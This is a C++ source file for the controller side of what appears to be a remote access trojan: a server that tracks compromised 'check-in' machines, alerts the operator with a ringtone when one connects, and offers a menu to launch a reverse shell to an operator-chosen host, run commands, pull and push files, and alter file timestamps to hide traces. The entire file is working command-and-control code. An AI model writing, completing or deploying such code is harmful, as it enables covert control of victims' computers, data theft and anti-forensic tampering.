#include"..\Eclipse\Eclipse.h"

#define dwMachineMaxCount 100
DWORD dwMachineCount = 0;
MachineDataStruct machineData[dwMachineMaxCount];
DWORD dwRingtone = 1;

int playMusic() {
    switch (dwRingtone)
    {
    case 1:
        PlaySoundA("ringtone\\1.wav", 0, 0);
        break;
    case 2:
        PlaySoundA("ringtone\\2.wav", 0, 0);
        break;
    case 3:
        PlaySoundA("ringtone\\3.wav", 0, 0);
        break;
    case 4:
        PlaySoundA("ringtone\\4.wav", 0, 0);
        break;
    case 5:
        PlaySoundA("ringtone\\5.wav", 0, 0);
        break;
    default:
        PlaySoundA("ringtone\\1.wav", 0, 0);
        break;
    }
    return 0;
}

int knock(SOCKET socket, int index) {
    ActionDataStruct responseActionData;
    memset(&responseActionData, 0, sizeof(ActionDataStruct));
    if (machineData[index].dwFlagControl) {
        strcpy_s(responseActionData.cAction, "Back");
        sendData(socket, (char*)&responseActionData, sizeof(ActionDataStruct));
    }
    else {
        strcpy_s(responseActionData.cAction, "Hello");
        sendData(socket, (char*)&responseActionData, sizeof(ActionDataStruct));
    }
    return 0;
}

DWORD WINAPI DownloadFile(LPVOID lpParam) {
    SOCKET socket = (SOCKET)lpParam;
    ActionDataStruct fileActionData, response;
    memset(&fileActionData, 0, sizeof(ActionDataStruct));
    recvData(socket, (char*)&fileActionData, sizeof(ActionDataStruct));
    //if (strcmp(fileActionData.cAction, "Filename") != 0) return 0;
    char cFileName[100] = "Download\\";
    strcat_s(cFileName, fileActionData.cAction);
    DWORD dwFileSize;
    sscanf_s(fileActionData.cMessage, "%d", &dwFileSize);
    //printf("%s : %d\n", cFileName, dwFileSize);
    memset(&response, 0, sizeof(ActionDataStruct));
    strcpy_s(response.cAction, "Ready");
    sendData(socket, (char*)&response, sizeof(ActionDataStruct));
    HANDLE hFile = CreateFileA(cFileName, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE)return 0;
    char* buf = (char*)malloc(dwFileSize), * ptr = buf;
    DWORD dwToRecv = dwFileSize, dwRecved = 0;
    do {
        dwRecved = recvData(socket, ptr, dwToRecv);
        dwToRecv -= dwRecved;
        ptr += dwRecved;
    } while (dwToRecv > 0);

    dwToRecv = dwFileSize, dwRecved = 0;
    do {
        WriteFile(hFile, buf, dwToRecv, &dwRecved, 0);
        dwToRecv -= dwRecved;
        ptr += dwRecved;
    } while (dwToRecv > 0);
    CloseHandle(hFile);
    free(buf);
    closesocket(socket);
    return 0;
}

DWORD WINAPI UploadFile(LPVOID lpParam) {
    DWORD index = (DWORD)lpParam;
    SOCKET socket = (SOCKET)machineData[index].socketFile;
    char cFileName[100];
    memset(cFileName, 0, 100);
    strcpy_s(cFileName, machineData[index].cUploadFile);
    char* ptr = cFileName;
    for (int n = 0; cFileName[n] != 0; n++)if (cFileName[n] == '\\')ptr = &cFileName[n + 1];

    HANDLE hFile = CreateFileA(cFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Upload => Open File Error.\n");
        return 0;
    }
    DWORD dwFileSize = GetFileSize(hFile, 0);
    ActionDataStruct fileActionData, response;
    memset(&fileActionData, 0, sizeof(ActionDataStruct));
    strcpy_s(fileActionData.cAction, ptr);
    sprintf_s(fileActionData.cMessage, "%d", dwFileSize);
    sendData(socket, (char*)&fileActionData, sizeof(ActionDataStruct));

    char* buf = (char*)malloc(dwFileSize);
    DWORD dwToRead = dwFileSize, dwReaded = 0;
    ptr = buf;
    do {
        ReadFile(hFile, ptr, dwToRead, &dwReaded, 0);
        dwToRead -= dwReaded;
        ptr += dwReaded;
    } while (dwToRead > 0);
    CloseHandle(hFile);

    DWORD dwToSend = dwFileSize, dwSended = 0;
    ptr = buf;
    do {
        dwSended = sendData(socket, ptr, dwToSend);
        dwToSend -= dwSended;
        ptr += dwSended;
    } while (dwToSend > 0);
    closesocket(socket);
    free(buf);
    return 0;
}

int CheckAction(SOCKET socket, SOCKADDR_IN addr) {
    ActionDataStruct actionData;
    memset(&actionData, 0, sizeof(ActionDataStruct));
    //printf("server: got connection from %s\n", inet_ntoa(addr->sin_addr));
    DWORD ret = recvData(socket, (char*) & actionData, sizeof(ActionDataStruct));
    if (ret <= 0) {
        closesocket(socket);
        return 0;
    }
    int n;
    if(strcmp(actionData.cAction, "Knock") == 0) {
        for (n = 0; n < dwMachineCount; n++)
            if (strcmp(actionData.cMessage, machineData[n].cComputerName)==0) 
                if(strcmp(machineData[n].cRemoteIP, inet_ntoa(addr.sin_addr))==0)
                    break;
        if (n == dwMachineCount) {
            memset(&machineData[n], 0, sizeof(MachineDataStruct));
            machineData[n].socket = socket;
            machineData[n].dwFlagControl = 0;
            machineData[n].dwFlagFile = 0;
            strcpy_s(machineData[n].cComputerName, actionData.cMessage);
            strcpy_s(machineData[n].cRemoteIP, inet_ntoa(addr.sin_addr));
            dwMachineCount++;
        }
        if (machineData[n].dwActive == 0) {
            machineData[n].dwActive = 1;
            playMusic();
        }
        knock(socket, n);
    }
    else if (strcmp(actionData.cAction, "Connect") == 0) {
        for (n = 0; n < dwMachineCount; n++)
            if (strcmp(actionData.cMessage, machineData[n].cComputerName) == 0)
                if (strcmp(machineData[n].cRemoteIP, inet_ntoa(addr.sin_addr)) == 0)
                    break;
        if (n == dwMachineCount)return 0;
        if (machineData[n].dwFlagControl == 0)return 0;
        machineData[n].socketControl = socket;
        machineData[n].dwFlagControl = 0;
        return 0;
    }
    else if (strcmp(actionData.cAction, "Download") == 0) {
        for (n = 0; n < dwMachineCount; n++)
            if (strcmp(actionData.cMessage, machineData[n].cComputerName) == 0)
                if (strcmp(machineData[n].cRemoteIP, inet_ntoa(addr.sin_addr)) == 0)
                    break;
        if (n == dwMachineCount)return 0;
        if (machineData[n].dwFlagFile == 0)return 0;
        machineData[n].dwFlagFile = 0;
        CreateThread(0, 0, DownloadFile, (LPVOID)socket, 0, 0);
        return 0;
    }
    else if (strcmp(actionData.cAction, "Upload") == 0) {
        for (n = 0; n < dwMachineCount; n++)
            if (strcmp(actionData.cMessage, machineData[n].cComputerName) == 0)
                if (strcmp(machineData[n].cRemoteIP, inet_ntoa(addr.sin_addr)) == 0)
                    break;
        if (n == dwMachineCount)return 0;
        if (machineData[n].dwFlagFile == 0)return 0;
        machineData[n].dwFlagFile = 0;
        machineData[n].socketFile = socket;
        CreateThread(0, 0, UploadFile, (LPVOID)n, 0, 0);
    }
    closesocket(socket);
    return 0;
}

DWORD WINAPI StartServer(LPVOID pParam) {
    int r;
    DWORD dwPort = (DWORD)pParam;
    WSAData wsaData;
    WORD DLLVSERION;
    DLLVSERION = MAKEWORD(2, 2);
    r = WSAStartup(DLLVSERION, &wsaData);
    SOCKADDR_IN addr;
    int addrlen = sizeof(addr);
    SOCKET sListen; //listening for an incoming connection
    SOCKET sConnect; //operating if a connection was found
    //sConnect = socket(AF_INET, SOCK_STREAM, NULL);
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(dwPort);
    sListen = socket(AF_INET, SOCK_STREAM, NULL);
    bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
    listen(sListen, SOMAXCONN);
    SOCKADDR_IN clientAddr;
    while (true) {
        memset((char*)&clientAddr, 0, sizeof(SOCKADDR_IN));
        if (sConnect = accept(sListen, (SOCKADDR*)&clientAddr, &addrlen)) {
            CheckAction(sConnect, clientAddr);
        }
    }
};

int showMachines(){
    printf("####################################################################################\n");
    printf("# %-s\t| %-20s\t| %-16s | %-20s | Active #\n", "index", "Computer Name", "IP", "Remark");
    for (int n = 0; n < dwMachineCount; n++) {
        printf("#   %d\t| %-20s\t| %-16s | %-20s | %-6s #\n",n , machineData[n].cComputerName, machineData[n].cRemoteIP, machineData[n].cRemark, machineData[n].dwActive ?"  Yes":"  No");
    }
    printf("####################################################################################\n");
    //printf("dwMachineCount: %d\n", dwMachineCount);
    printf("\n");
    return 0;
}

int controlManual() {
    char manual[] =
        "1. shell\t: Reverse Shell\n" \
        "2. down \t: Download File\n" \
        "3. up   \t: Upload File\n" \
        "4. cmd  \t: Execute Single CMD\n" \
        "5. edit \t: Edit Remark\n" \
        "6. help \t: Show Help\n" \
        "7. cft  \t: Change File Time\n" \
        "9. exit \t: Exit\n";
    printf("%s", manual);
    return 0;
}

int useMachine() {
    if (dwMachineCount == 0)return 0;
    int index;
    printf("  [Machine Index] => ");
    scanf_s("%d", &index);
    getchar();
    if (index >= dwMachineCount) {
        printf("Input Index Error.\n");
        return 0;
    }
    machineData[index].dwFlagControl = 1;
    printf("Waiting Connect... ");
    while (machineData[index].dwFlagControl)Sleep(200);
    SOCKET socket = machineData[index].socketControl;
    printf("Connected !\n\n");
    char buf[0x1000];
    controlManual();
    ActionDataStruct controlActionData;
    while (1) {
        printf("  [Master Operator] => ");
        memset(buf, 0, 0x1000);
        cin.getline(buf, 0x1000);
        //printf("%s\n", buf);
        if (strcmp(buf, "shell") == 0|| strcmp(buf, "1") == 0) {
            memset((char*)&controlActionData, 0, sizeof(ActionDataStruct));
            printf("  Input (127.0.0.1 4444): ");
            strcpy_s(controlActionData.cAction, "Shell");
            cin.getline(controlActionData.cMessage, sizeof(controlActionData.cMessage));
            sendData(socket, (char*)&controlActionData, sizeof(ActionDataStruct));
        }
        else if (strcmp(buf, "down") == 0|| strcmp(buf, "2") == 0) {
            memset((char*)&controlActionData, 0, sizeof(ActionDataStruct));
            printf("  Download FileName: ");
            strcpy_s(controlActionData.cAction, "Download");
            cin.getline(controlActionData.cMessage, sizeof(controlActionData.cMessage));
            sendData(socket, (char*)&controlActionData, sizeof(ActionDataStruct));
            machineData[index].dwFlagFile = 1;
        }
        else if (strcmp(buf, "up") == 0|| strcmp(buf, "3") == 0) {
            memset((char*)&controlActionData, 0, sizeof(ActionDataStruct));
            printf("  Upload FileName: ");
            strcpy_s(controlActionData.cAction, "Upload");
            memset(machineData[index].cUploadFile, 0, 100);
            cin.getline(machineData[index].cUploadFile, 100);
            if (!PathFileExistsA(machineData[index].cUploadFile)) {
                printf("%s not exist.\n", machineData[index].cUploadFile);
                memset(machineData[index].cUploadFile, 0, 100);
            }
            else {
                char* ptr = machineData[index].cUploadFile;
                for (int n = 0; machineData[index].cUploadFile[n] == 0; n++)
                    ptr = &machineData[index].cUploadFile[n];
                strcpy_s(controlActionData.cMessage, ptr);
                sendData(socket, (char*)&controlActionData, sizeof(ActionDataStruct));
                machineData[index].dwFlagFile = 1;
            }
        }
        else if (strcmp(buf, "cmd") == 0|| strcmp(buf, "4") == 0) {
            while (1) {
                printf("  [CMD] => ");
                char buf[0x1000], cFileSize[0x10];
                memset(buf, 0, 0x1000);
                cin.getline(buf, 0x1000);
                if (strcmp(buf, "exit") == 0)break;
                else if (strcmp(buf, "") == 0)continue;
                memset((char*)&controlActionData, 0, sizeof(ActionDataStruct));
                strcpy_s(controlActionData.cAction, "Cmd");
                sendData(socket, (char*)&controlActionData, sizeof(ActionDataStruct));
                sendData(socket, buf, 0x1000);
                memset(cFileSize, 0, 0x10);
                recvData(socket, cFileSize, 0x10);
                DWORD dwFileSize;
                sscanf_s(cFileSize, "%d", &dwFileSize);
                char* ptr = (char*)malloc(dwFileSize + 1);
                memset(ptr, 0, dwFileSize + 1);
                recvData(socket, ptr, dwFileSize);
                printf("%s\n", ptr);
                free(ptr);
            }
        }
        else if (strcmp(buf, "edit") == 0 || strcmp(buf, "5") == 0) {
            printf("Edit Remark: ");
            memset(machineData[index].cRemark, 0, sizeof(machineData[index].cRemark));
            cin.getline(machineData[index].cRemark, sizeof(machineData[index].cRemark));
        }
        else if (strcmp(buf, "help") == 0|| strcmp(buf, "6") == 0) {
            controlManual();
        }
        else if (strcmp(buf, "cft") == 0 || strcmp(buf, "7") == 0) {
            char dst[0x100], src[0x100], response[0x100];
            memset(dst, 0, 0x100);
            memset(src, 0, 0x100);
            memset(response, 0, 0x100);
            printf("  [Destination File] => ");
            cin.getline(dst, 0x100);
            printf("  [Source File] => ");
            cin.getline(src, 0x100);

            memset((char*)&controlActionData, 0, sizeof(ActionDataStruct));
            strcpy_s(controlActionData.cAction, "CFT");
            sendData(socket, (char*)&controlActionData, sizeof(ActionDataStruct));
            sendData(socket, dst, 0x100);
            sendData(socket, src, 0x100);
            recvData(socket, response, 0x100);
            printf("%s\n", response);
        }
        else if (strcmp(buf, "exit") == 0 || strcmp(buf, "9") == 0) {
            break;
        }
    }
    closesocket(socket);
    return 0;
}

int SaveStatus() {
    HANDLE hFile = CreateFileA("Machines.conf", GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Create File Error.\n");
        return 0;
    }
    char* ptr = (char*)machineData;
    DWORD dwToWrite = sizeof(MachineDataStruct) * dwMachineMaxCount, dwWrited = 0;
    do {
        WriteFile(hFile, ptr, dwToWrite, &dwWrited, 0);
        dwToWrite -= dwWrited;
        ptr += dwWrited;
    } while (dwToWrite > 0);
    WriteFile(hFile, &dwMachineCount, sizeof(DWORD), &dwWrited, 0);
    CloseHandle(hFile);
    printf("Save Success.\n\n");
    return 0;
}

int LoadStatus() {
    HANDLE hFile = CreateFileA("Machines.conf", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] No Config File.\n");
        return 0;
    }
    char* ptr = (char*)machineData;
    DWORD dwToRead = sizeof(MachineDataStruct) * dwMachineMaxCount, dwReaded = 0;
    do {
        ReadFile(hFile, ptr, dwToRead, &dwReaded, 0);
        dwToRead -= dwReaded;
        ptr += dwReaded;
    } while (dwToRead > 0);
    ReadFile(hFile, &dwMachineCount, sizeof(DWORD), &dwReaded, 0);
    CloseHandle(hFile);

    for (int n = 0; n < dwMachineCount; n++) {
        machineData[n].dwActive = 0;
    }
    return 0;
}
int DeleteMachine() {
    showMachines();
    int index;
    char buf[100];
    printf("Delete Machine Index => ");
    scanf_s("%d", &index);
    cin.getline(buf, 100);
    printf("Ready to delete No.%d ? [Y/n]", index);
    memset(buf, 0, 100);
    cin.getline(buf, 100);
    if (strstr(buf, "N") || strstr(buf, "n"))return 0;
    memcpy_s(&machineData[index], sizeof(MachineDataStruct), &machineData[--dwMachineCount], sizeof(MachineDataStruct));
    memset(&machineData[dwMachineCount], 0, sizeof(MachineDataStruct));
    return 0;
}

char string_MainControl[] = 
    //"##################################\n"
    //"#             Manual             #\n"
    //"##################################\n"
    //"1. Show Check-In Machines.\n" 
    "1. use  \t: Use Machine.\n"
    "2. show \t: Show Machines.\n"
    "3. save \t: Save Machines Status.\n"
    "4. delete\t: Delete Machine.\n"
    "5. alert\t: Set Alert Music.\n"
    "6. help \t: Show Manual.\n"
    "9. exit\n\n"
    "  [Control Panel] => ";

int MainControl() {
    CreateDirectoryA("Download", 0);
    LoadStatus();
    int flag = 1;
    while (flag) {
        printf("%s", string_MainControl);
        char buf[0x1000];
        cin.getline(buf, 0x1000);
        
        if(strcmp(buf, "use") == 0|| strcmp(buf, "1") == 0) {
            showMachines();
            useMachine();
        }
        else if (strcmp(buf, "show") == 0 || strcmp(buf, "2") == 0) {
            showMachines();
        }
        else if (strcmp(buf, "save") == 0 || strcmp(buf, "3") == 0) {
            SaveStatus();
        }
         else if (strcmp(buf, "delete") == 0|| strcmp(buf, "4") == 0) {
            DeleteMachine();
        }
         else if (strcmp(buf, "alert") == 0 || strcmp(buf, "5") == 0) {
            printf("Select music (1-5): ");
            scanf_s("%d", &dwRingtone);
            cin.getline(buf, 0x1000);
        }
         else if (strcmp(buf, "help") == 0 || strcmp(buf, "6") == 0) {
            printf("%s", string_MainControl);
        }
        else if (strcmp(buf, "exit") == 0 || strcmp(buf, "9") == 0) {
            flag = 0;
        }
    }
    return 0;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("%s Port\n", argv[0]);
        return 0;
    }
    DWORD dwPort = 0;
    sscanf_s(argv[1], "%d", &dwPort);
    HANDLE hThread = CreateThread(NULL, 0, StartServer, (LPVOID)dwPort, 0, NULL);
    MainControl();
	return 0;
}